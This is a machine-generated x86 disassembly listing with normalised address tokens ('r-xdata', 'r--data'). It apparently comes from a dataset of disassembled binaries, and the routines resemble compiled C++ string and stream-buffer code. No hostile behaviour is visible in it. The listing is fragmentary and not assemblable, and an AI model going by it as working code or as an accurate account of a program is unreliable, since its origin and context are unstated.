test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
xor ecx ecx
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
leave
retn 0x20
mov edi edx
mov esi [ esi ]
mov [ ebp + 0x24 ] esi
test esi esi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
mov edi [ r--data ]
jmp r-xdata
jg r-xdata
jg r-xdata
mov ebx [ r--data ]
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
jl r-xdata
jl r-xdata
sub esi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add esi edi
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
add [ eax ] esi
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp edi eax
ja r-xdata
sub esi [ ebp + 0x24 ]
mov eax [ ecx + 0x34 ]
add esi edi
sub [ eax ] esi
mov ecx [ ecx + 0x24 ]
add [ ecx ] esi
jmp r-xdata
cmp edi eax
ja r-xdata
mov edx [ ecx + 0x24 ]
mov esi [ edx ]
test esi esi
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp + 0x24 ] eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax esi
mov esi [ ebp + 0x24 ]
mov [ edx ] esi
mov ecx [ ecx + 0x34 ]
sub eax esi
mov [ ecx ] eax
jmp r-xdata
sub_404521
push 0x448
mov eax sub_44e4c5
call sub_4485fe
and [ ebp - 0x248 ] 0x0
lea eax [ ebp - 0x454 ]
push eax
mov [ ebp - 0x24c ] esi
call sub_404d80
push eax
xor ebx ebx
lea eax [ ebp - 0x244 ]
inc ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_404cd0
push esi
push eax
mov [ ebp - 0x4 ] 0x2
call sub_404d41
lea eax [ ebp - 0x244 ]
push eax
mov [ ebp - 0x248 ] ebx
mov [ ebp - 0x4 ] bl
call sub_40466e
lea ecx [ ebp - 0x254 ]
call sub_402f60
mov eax esi
call sub_448681
retn
sub_40459b
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov eax esi
call sub_4046b6
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4045bd
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_446d07
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4045e4
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov eax esi
call sub_4046d4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_404606
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_403ccd
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_404625
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_402f60
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_404644
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_404006
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40466e
push 0x0
mov eax sub_44ccb2
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x224 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_404dc3
mov [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x220 ]
test esi esi
je r-xdata
lea ecx [ edi + 0x208 ]
call sub_402f60
call sub_44866d
retn 0x4
call sub_40379c
sub_404720
push ebp
mov ebp esp
xor eax eax
push 0xffffffff
push eax
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov ecx esi
mov [ esi ] al
call sub_404e0f
mov eax esi
pop ebp
retn 0x4
sub_404744
cmp edi esi
je r-xdata
mov eax edi
retn
push 0x0
push 0x1
mov ecx edi
call sub_40487c
cmp [ esi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
and [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
push eax
push esi
push edi
call sub_424b60
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
and [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi ] 0x0
sub_4047a1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax + 0x1 ]
push ebx
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
push eax
push [ ebp + 0x8 ]
call sub_404ea8
pop ebx
pop ebp
retn 0x4
sub_4047c2
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ esi + 0x14 ] 0x10
push edi
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
sub eax ecx
mov edi eax
xor edi edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
add esi edi
pop edi
mov [ ebx ] esi
mov eax ebx
pop esi
pop ebp
retn 0x8
mov esi [ esi ]
push [ ebp + 0xc ]
call sub_404f1d
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_404814
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ edx + 0x10 ]
cmp eax ebx
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ebx ecx
jae r-xdata
mov ebx eax
cmp [ edx + 0x14 ] 0x10
jb r-xdata
mov ecx ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi edx
xor eax eax
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
mov edx [ edx ]
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
pop ebx
pop ebp
retn 0x8
cmp ebx [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp ebx [ ebp + 0xc ]
setne al
or eax 0xffffffff
jmp r-xdata
sub_40487c
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_424fc7
pop ecx
pop ebx
push edi
push ebx
push esi
call sub_4247f0
add esp 0xc
sub_404912
push ebp
mov ebp esp
push ecx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
pop ecx
pop ebp
retn 0x4
push [ ebp + 0x8 ]
call sub_4033fb
sub_40493e
push 0x8
mov eax sub_44d934
call sub_4485c8
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
push 0x0
or eax 0x2
call sub_404912
xor al al
mov ecx [ ecx + 0x3c ]
test ecx ecx
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x14 ]
test cl 0x1
je r-xdata
mov esi ecx
call sub_403c0a
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov eax [ eax + 0x4 ]
add eax edi
lea esi [ ebp - 0x14 ]
call sub_4034a7
and [ ebp - 0x4 ] 0x0
push eax
call sub_405d3b
pop ecx
mov ecx esi
mov ebx eax
call sub_402f60
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
call sub_403cf6
mov al 0x1
jmp r-xdata
mov ecx [ ebx + 0x10 ]
movzx eax al
test [ ecx + eax * 2 ] 0x48
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
mov eax [ ecx + 0xc ]
push 0x0
or eax 0x1
call sub_404912
jmp r-xdata
call sub_44866d
retn 0x4
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov esi [ eax + edi + 0x38 ]
call sub_403d16
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_404a5c
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
jmp [ eax + 0x1c ]
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_404a89
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
movzx edx dl
push edx
call [ eax + 0xc ]
retn
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
push esi
lea esi [ eax + 0x1 ]
mov [ ecx ] esi
mov [ eax ] dl
movzx eax dl
pop esi
retn
test eax eax
jle r-xdata
sub_404bdf
test [ esi + 0x40 ] 0x1
je r-xdata
mov ecx [ esi + 0x10 ]
xor eax eax
mov [ ecx ] eax
mov ecx [ esi + 0x20 ]
mov [ ecx ] eax
mov ecx [ esi + 0x30 ]
mov [ ecx ] eax
mov ecx [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] eax
retn
mov eax [ esi + 0x10 ]
push [ eax ]
call sub_424fc7
pop ecx
sub_404c18
push 0x0
mov eax sub_44d911
call sub_448595
mov ebx [ ebp + 0x8 ]
mov eax edi
mov esi ebx
call sub_40517e
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0xc ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0xc ] 0x0
sete al
mov [ ebx + 0x4 ] al
mov eax ebx
call sub_44866d
retn 0x4
mov eax [ eax + edi + 0x3c ]
test eax eax
je r-xdata
mov esi eax
call sub_403c0a
sub_404c69
push 0x0
mov eax sub_44d8ee
call sub_448595
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call j_sub_448a21
test al al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax esi
call sub_405197
call sub_44866d
retn 0x4
mov ecx [ esi ]
call sub_404fe2
sub_404cd0
push 0x0
mov eax sub_44d8cb
call sub_448595
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
xor esi esi
lea ebx [ edi + 0x8 ]
push ebx
mov [ edi ] esi
mov [ edi + 0x4 ] esi
call sub_4051b2
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ edi + 0x218 ] ax
mov [ edi + 0x21c ] esi
mov [ edi + 0x220 ] esi
push ecx
mov [ ebp + 0xc ] esp
lea esi [ edi + 0x224 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] esp
call sub_405b80
push ebx
mov ecx r--data
mov [ ebp - 0x4 ] 0x2
call sub_405f54
mov [ edi + 0x218 ] ax
pop ecx
mov eax edi
call sub_44866d
retn 0x8
sub_404d41
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
cmp eax r--data
jne r-xdata
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx r--data
call sub_405fc2
mov eax [ ebp + 0xc ]
leave
retn 0x8
push 0x89
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_404d80
push 0x4
mov eax sub_44cc7f
call sub_448595
call sub_4470dc
mov [ ebp - 0x10 ] eax
call sub_446e1d
mov ecx eax
call sub_402eaf
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_40511a
lea ecx [ ebp - 0x10 ]
call sub_402f60
mov eax [ ebp + 0x8 ]
call sub_44866d
retn 0x4
sub_404dc3
push 0x4
mov eax sub_44cc5c
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_405618
or [ ebp - 0x4 ] 0xffffffff
push [ edi + 0x4 ]
call sub_424fc7
pop ecx
call sub_44866d
retn 0x4
sub_404e0f
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x10 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push edi
cmp eax ecx
jae r-xdata
sub eax ecx
mov edi eax
cmp [ ebp + 0x10 ] edi
jae r-xdata
push r--data
call sub_446ae2
cmp esi ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push 0x0
push edi
mov ecx esi
call sub_40545e
test al al
je r-xdata
add edi ecx
push 0xffffffff
push edi
mov ecx esi
call sub_4053a7
push [ ebp + 0xc ]
mov ecx esi
push 0x0
call sub_4053a7
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
add eax [ ebp + 0xc ]
push edi
push eax
push ecx
call sub_4247f0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ eax + edi ] 0x0
sub_404ea8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push ebx
mov esi ecx
call sub_4054c2
test al al
je r-xdata
push edi
mov edi [ ebp + 0xc ]
push 0x0
push edi
mov ecx esi
call sub_40545e
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_404e0f
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edi
push ebx
push eax
call sub_4247f0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ eax + edi ] 0x0
sub_404f1d
push ebp
mov ebp esp
mov eax [ esi + 0x10 ]
cmp eax edi
jae r-xdata
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
push r--data
call sub_446ae2
push ebx
lea ebx [ eax + 0x1 ]
push 0x0
push ebx
mov ecx esi
call sub_40545e
test al al
je r-xdata
push r--data
call sub_446a95
mov eax esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
push edx
add ecx edi
push ecx
lea eax [ eax + edi + 0x1 ]
push eax
call sub_424b60
mov dl [ ebp + 0x8 ]
add esp 0xc
push 0x1
mov ecx edi
mov eax esi
call sub_40542a
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ebx
jb r-xdata
mov [ eax + ebx ] 0x0
sub_405015
push ebp
mov ebp esp
push edi
mov edi eax
call sub_403514
mov eax [ ebp + 0x8 ]
and [ edi + 0x3c ] 0x0
push edi
mov [ edi + 0x38 ] eax
call sub_405508
cmp [ edi + 0x38 ] 0x0
mov [ edi + 0x40 ] al
jne r-xdata
pop edi
pop ebp
retn 0x4
mov eax [ edi + 0xc ]
push 0x0
or eax 0x4
mov ecx edi
call sub_404912
sub_40504d
push 0x0
mov eax sub_44a801
call sub_448595
mov edi [ ebp + 0x8 ]
lea ecx [ edi + 0x4 ]
mov [ edi ] r--data
call sub_447329
and [ ebp - 0x4 ] 0x0
push 0x4
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor eax eax
mov esi eax
call sub_402f4a
jmp r-xdata
mov [ edi + 0x38 ] eax
mov eax edi
call sub_405549
mov eax edi
call sub_44866d
retn 0x4
sub_405099
mov eax [ esi + 0x40 ]
and eax 0x6
cmp al 0x6
je r-xdata
retn
push edi
push 0x0
push ebx
call sub_405e71
push ebx
mov edi eax
push 0x0
push edi
call sub_4247f0
add esp 0x14
test [ esi + 0x40 ] 0x4
lea eax [ edi + ebx ]
mov [ esi + 0x3c ] eax
jne r-xdata
mov ecx [ esi + 0x40 ]
test cl 0x2
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov ecx [ esi + 0x30 ]
mov [ ecx ] ebx
or [ esi + 0x40 ] 0x1
pop edi
test cl 0x10
jne r-xdata
mov ecx [ esi + 0x14 ]
mov [ ecx ] edi
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx edi
sub ecx eax
mov eax [ esi + 0x34 ]
add ecx ebx
mov [ eax ] ecx
mov eax [ esi + 0x20 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] edi
sub_40511a
push 0x4
mov eax sub_44cc39
call sub_448595
mov ebx [ ebp + 0x8 ]
lea esi [ ebx + 0x200 ]
call sub_402f4a
and [ ebp - 0x4 ] 0x0
push ecx
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
mov eax esp
mov [ ebp - 0x10 ] esp
mov [ eax ] ecx
call sub_402eaf
lea eax [ ebp + 0xc ]
push eax
call sub_405593
lea ecx [ ebp + 0xc ]
call sub_402f60
mov eax ebx
call sub_44866d
retn 0x8
sub_4051b2
push 0x0
mov eax sub_44cc10
call sub_448595
mov ebx [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_405317
and [ ebp - 0x4 ] 0x0
and [ ebx + 0x208 ] 0x0
push ebx
mov ecx r--data
call sub_405f54
push ebx
mov ecx r--data
mov [ ebx + 0x20c ] ax
call sub_405f54
pop ecx
mov [ ebx + 0x20e ] ax
pop ecx
mov eax ebx
call sub_44866d
retn 0x8
sub_405204
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_405b80
mov eax esi
pop esi
leave
retn
sub_40521c
push ebp
mov ebp esp
push ecx
mov ecx [ eax + 0x4 ]
mov edx [ ecx ]
push esi
push ecx
push edx
lea esi [ ebp - 0x4 ]
call sub_405618
pop esi
leave
retn
sub_4052ec
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_405699
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_405317
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi eax
mov ecx 0x80
mov edi ebx
[ edi ] [ esi ]
mov ecx [ eax + 0x200 ]
mov [ ebx + 0x200 ] ecx
call sub_402eaf
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x204 ]
pop edi
mov [ ebx + 0x204 ] eax
mov eax ebx
pop esi
pop ebp
retn 0x4
sub_405352
push ebp
mov ebp esp
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
push edi
lea edi [ eax + 0x1 ]
push 0x0
push edi
mov ecx esi
call sub_40545e
test al al
je r-xdata
push r--data
call sub_446a95
mov eax esi
pop edi
pop ebp
retn 0x4
mov dl [ ebp + 0x8 ]
mov ecx [ esi + 0x10 ]
push 0x1
mov eax esi
call sub_40542a
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_4053a7
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0xc ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_446ae2
test ebx ebx
je r-xdata
mov ebx eax
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push edi
cmp edx 0x10
jb r-xdata
mov edi esi
mov edi [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
sub eax ebx
add edi ecx
push eax
add edi ebx
add edx ecx
push edi
push edx
call sub_424b60
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax ebx
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop edi
jb r-xdata
mov [ ecx + eax ] 0x0
sub_40542a
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
push [ ebp + 0x8 ]
movsx edx dl
push edx
add eax ecx
push eax
call sub_4338e0
add esp 0xc
mov eax [ eax ]
mov [ eax + ecx ] dl
jmp r-xdata
mov eax [ eax ]
pop ebp
retn 0x4
sub_40545e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jbe r-xdata
mov eax [ ecx + 0x14 ]
cmp eax esi
jae r-xdata
push r--data
call sub_446a95
xor edx edx
cmp [ ebp + 0xc ] dl
je r-xdata
push [ ecx + 0x10 ]
push esi
call sub_40573f
jmp r-xdata
cmp esi edx
jne r-xdata
cmp esi 0x10
jae r-xdata
xor eax eax
cmp eax esi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
mov [ ecx + 0x10 ] edx
cmp eax 0x10
jb r-xdata
mov eax [ ecx + 0x10 ]
cmp esi eax
jae r-xdata
mov [ ecx ] dl
mov ecx [ ecx ]
push eax
push 0x1
call sub_40487c
jmp r-xdata
mov eax esi
sub_4054c2
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
mov edx [ ecx + 0x14 ]
cmp edx 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
cmp [ ebp + 0x8 ] eax
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx + 0x10 ]
add ecx eax
cmp ecx [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x4
sub_405508
push 0x0
mov eax sub_44cbed
call sub_448595
mov eax [ ebp + 0x8 ]
lea esi [ ebp + 0x8 ]
call sub_4034a7
and [ ebp - 0x4 ] 0x0
push eax
call sub_405d3b
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp + 0x8 ]
mov esi eax
call sub_402f60
mov eax [ esi ]
push 0x20
mov ecx esi
call [ eax + 0x18 ]
call sub_44866d
retn 0x4
sub_405549
lea edx [ eax + 0x18 ]
mov [ eax + 0x20 ] edx
lea edx [ eax + 0x1c ]
mov [ eax + 0x24 ] edx
lea edx [ eax + 0x28 ]
mov [ eax + 0x30 ] edx
lea ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
lea edx [ eax + 0x2c ]
mov [ eax + 0x34 ] edx
xor edx edx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] ecx
mov [ ecx ] edx
mov ecx [ eax + 0x24 ]
mov [ ecx ] edx
mov ecx [ eax + 0x34 ]
mov [ ecx ] edx
mov ecx [ eax + 0x10 ]
mov [ ecx ] edx
mov ecx [ eax + 0x20 ]
mov [ ecx ] edx
mov eax [ eax + 0x30 ]
mov [ eax ] edx
retn
sub_405593
push 0x4
mov eax sub_44cbca
call sub_448595
and [ ebp - 0x10 ] 0x0
xor edi edi
inc edi
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
lea esi [ ebx + 0x200 ]
mov ecx [ esi ]
mov [ eax ] ecx
call sub_402eaf
mov [ ebp - 0x10 ] edi
lea edi [ ebp + 0xc ]
call sub_402f78
push esi
call sub_405d3b
pop ecx
mov ecx esi
mov esi ebx
mov [ ebx + 0x204 ] eax
call sub_405831
mov ecx edi
call sub_402f60
mov eax [ ebp + 0x8 ]
call sub_44866d
retn 0x8
sub_4055f2
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_405b80
mov eax esi
pop esi
leave
retn
sub_405618
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
mov ecx [ edi + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp eax [ ecx ]
jne r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
mov [ esi ] eax
mov eax esi
pop edi
leave
retn 0x8
push ebx
call sub_405b57
mov eax [ edi + 0x4 ]
mov eax [ eax ]
jmp r-xdata
mov ebx eax
lea eax [ ebp + 0x8 ]
call sub_405d05
push ebx
lea eax [ ebp - 0x4 ]
push eax
push edi
call sub_4058f9
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
pop ebx
sub_4056b5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push ebx
or ebx 0xffffffff
cmp eax 0xffffffff
jae r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_446a95
mov eax esi
pop ebx
pop ebp
retn 0x4
push edi
lea edi [ eax + ebx ]
push 0x0
push edi
mov ecx esi
call sub_40545e
test al al
je r-xdata
pop edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push ebx
push ecx
mov ecx [ esi + 0x10 ]
add ecx eax
push ecx
call sub_4247f0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ eax + edi ] 0x0
sub_40573f
push 0xc
mov eax sub_44b5f7
call sub_4485c8
mov esi ecx
mov [ ebp - 0x18 ] esi
mov edi [ ebp + 0x8 ]
or edi 0xf
cmp edi 0xfffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax edi
pop ebx
div ebx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp edx eax
jbe r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x1 ]
push 0x0
push eax
call sub_405e71
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
jmp sub_4057cf
push 0xfffffffe
pop edi
mov eax edi
sub eax edx
cmp ecx eax
ja r-xdata
lea edi [ edx + ecx ]
sub_4057a1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_405e71
pop ecx
mov [ ebp + 0x8 ] eax
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_4057cf
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
push 0x0
push 0x1
mov ecx esi
call sub_40487c
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x10
jae r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
